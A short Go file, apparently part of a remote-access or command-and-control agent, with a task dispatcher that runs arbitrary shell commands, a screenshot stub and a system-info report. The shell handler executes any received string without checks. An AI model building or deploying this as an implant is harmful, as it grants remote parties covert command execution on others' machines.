package main

import (
	"fmt"
	"os/exec"
	"runtime"
)

func (a *Agent) executeTask(task Task) string {
	switch task.Command {
	case "shell":
		return a.executeShell(task.Args)
	case "screenshot":
		return a.takeScreenshot()
	case "sysinfo":
		return a.getSystemInfo()
	default:
		return fmt.Sprintf("Unknown command: %s", task.Command)
	}
}

func (a *Agent) executeShell(command string) string {
	var cmd *exec.Cmd

	if runtime.GOOS == "windows" {
		cmd = exec.Command("cmd", "/C", command)
	} else {
		cmd = exec.Command("sh", "-c", command)
	}

	output, err := cmd.CombinedOutput()
	if err != nil {
		return fmt.Sprintf("Error: %s", err)
	}

	return string(output)
}

func (a *Agent) takeScreenshot() string {
	// TODO: Implement per platform
	return "Screenshot not implemented yet"
}

func (a *Agent) getSystemInfo() string {
	return fmt.Sprintf("Platform: %s, Hostname: %s", a.Platform, a.Hostname)
}
